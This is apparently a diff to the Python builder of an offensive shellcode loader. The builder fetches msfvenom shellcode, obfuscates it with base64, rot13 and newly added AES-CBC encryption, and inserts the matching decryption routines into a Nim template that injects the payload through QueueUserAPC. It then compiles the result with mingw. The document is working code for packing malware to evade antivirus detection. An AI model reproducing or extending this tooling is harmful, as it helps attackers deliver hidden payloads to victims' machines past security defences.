@@ -7,7 +7,8 @@ from cli import generate_cli_args
 from modules.python.converters.bin2sc import bin2sc
 #from modules.python.converters.bin2mac import bin2mac
 from modules.python.obfuscators.encoders.b64_obf import b64_obf, add_base64_decoding_code
-from modules.python.obfuscators.encoders.rot13_obf import rot13_obf, add_rot13_decoding_code
+from modules.python.obfuscators.encoders.rot13_obf import rot13_obf, add_rot13_decoding_code, rot13_decode
+from modules.python.obfuscators.encryptors.aes_obf import aes_obf, add_aes_decryption_code, seperateStringInto2, byteSeqToString, strToByteSeq, decryptAES
 
 config = json.load(open(file='./config.json', encoding="utf-8"))  # Read json config file
 
@@ -39,6 +40,7 @@ REGULAR_BINARY_CODE = "injectQueueUserAPC(shellcode)"
 SHELLCODE_PLACEHOLDER = config["shellcode_placeholder"]
 SHELLCODE_SIZE_PLACEHOLDER = config["shellcode_size_placeholder"]
 TARGET_APPLICATION_PATH_PLACEHOLDER = config["target_application_path_placeholder"]
+DEOBFUSCATION_FUNCTION_PLACEHOLDER = config["deobfuscation_function_placeholder"]
 
 NIM_EBAPC_SKEL_FILENAME = config["nim_ebapc_skel_filename"]
 NIM_EBAPC_FILENAME = config["nim_ebapc_filename"]
@@ -81,17 +83,29 @@ def inject_sc_size(nim_code: str, sc_size: int) -> str:
 def inject_application_path(nim_code: str, target_application_path: str) -> str:
     nim_code = nim_code.replace(TARGET_APPLICATION_PATH_PLACEHOLDER, target_application_path)
     return nim_code
-1
+
 # Write the nim code to a new nim file
 def create_new_nim_file(new_nim_filename: str, nim_code: str):
     with open(new_nim_filename, 'w') as f:
         f.write(nim_code)
 
+def add_deobfuscation_functions(nim_code: str, function_names: tuple) -> str:
+    """
+    add_deobfuscation_function(nim_code, function_names)
+
+    Get nim_code, replace   DEOBFUSCATION_FUNCTION_PLACEHOLDER with the given deobfuscation function
+    Return:
+        nim_code with the added function (str)
+    """
+    for function_name in function_names:
+        nim_code = nim_code.replace(DEOBFUSCATION_FUNCTION_PLACEHOLDER, function_name)
+
+    return nim_code
+
 # Add obfuscation code
 def add_obfuscation(nim_code: str, sc: str, obfuscation_methods: str, available_obfuscation_methods: list) -> str:
     obfuscation_methods = obfuscation_methods.split(',')  # Convert from string of format "base64,xor,..." to list
-    base64_count = obfuscation_methods.count("base64")
-    rot13_count = obfuscation_methods.count("rot13")
+
     # Obfuscate and add the shellcode into the nim code
     for method in obfuscation_methods:
         print("Encoding: ", method)
@@ -100,8 +114,33 @@ def add_obfuscation(nim_code: str, sc: str, obfuscation_methods: str, available_
                 sc = b64_obf(sc)
             case 'rot13':
                 sc = rot13_obf(sc)
+            case 'aes-cbc':
+                sc, key, iv, padding_length = aes_obf(sc)    # sc, key and iv are hex encoded
+                #print(      # DEBUG
+                #    f"""
+                #    sc: {sc}
+                #    hex_key: {key}
+                #    hex_iv: {iv}
+                #    padding_length: {padding_length}
+                #    """
+                #) 
             case other:
-                print("Obfuscation method is not found, allowed obfuscation methods are: {available_obfuscation_methods}")
+                print(f"Obfuscation method is not found, allowed obfuscation methods are: {available_obfuscation_methods}")
+        
+    # Add necessary decoding/decryption functions to nim_code
+    # NOTE: Why not a function?
+    for method in set(obfuscation_methods):
+        print("Adding functions for: ", method)
+        match method:
+            case 'base64':
+                pass    # Base64 decoding doesn't need an external function
+            case 'rot13':
+                nim_code = add_deobfuscation_functions(nim_code, (rot13_decode,))
+            case 'aes-cbc':
+                nim_code = add_deobfuscation_functions(nim_code, (seperateStringInto2, byteSeqToString, strToByteSeq, decryptAES))
+            case other:
+                print(f"Decryption method not found, allowed decryption methods are: {available_obfuscation_methods}")
+
     # Add deobfuscation codes to the nim code
     obfuscation_methods.reverse()   # Reverse the obfuscation list
     for method in obfuscation_methods:
@@ -111,9 +150,11 @@ def add_obfuscation(nim_code: str, sc: str, obfuscation_methods: str, available_
                 nim_code = add_base64_decoding_code(nim_code)
             case 'rot13':
                 nim_code = add_rot13_decoding_code(nim_code)
+            case 'aes-cbc':
+                nim_code = add_aes_decryption_code(nim_code, key, iv, str(padding_length))
             case other:
-                print("Deobfuscation method is not found, allowed obfuscation methods are: {available_obfuscation_methods}")
-
+                print(f"Deobfuscation method is not found, allowed obfuscation methods are: {available_obfuscation_methods}")
+    
     # Inject obfuscated shellcode into nim code
     nim_code = inject_sc(nim_code, sc)
     return nim_code
@@ -127,7 +168,7 @@ def main():
     args = generate_cli_args()
 
     # Get shellcode
-    # NOTE: (why not a function?)
+    # NOTE: Why not a function?
     if args.msfvenom_command:
         msf_sc = run_msfvenom(args.msfvenom_command)    # Run msfvenom
         sc = grep_shellcode(msf_sc)                     # Get shellcode
@@ -150,7 +191,7 @@ def main():
         nim_code = nim_code.replace(REGULAR_BINARY_CODE_PLACEHOLDER, REGULAR_BINARY_CODE)
         cmd = f"nim c -d:mingw -o:{args.output} --lineTrace:off --stackTrace:off --opt:size -d:release --cpu:{args.cpu} --app:{args.app} {NIM_EBAPC_FILENAME}"
 
-    # print(nim_code) # DEBUG
+    #print(nim_code) # DEBUG
     create_new_nim_file(NIM_EBAPC_FILENAME, nim_code)  # Create the obfuscated nim file
 
     subprocess.run(cmd, shell=True)
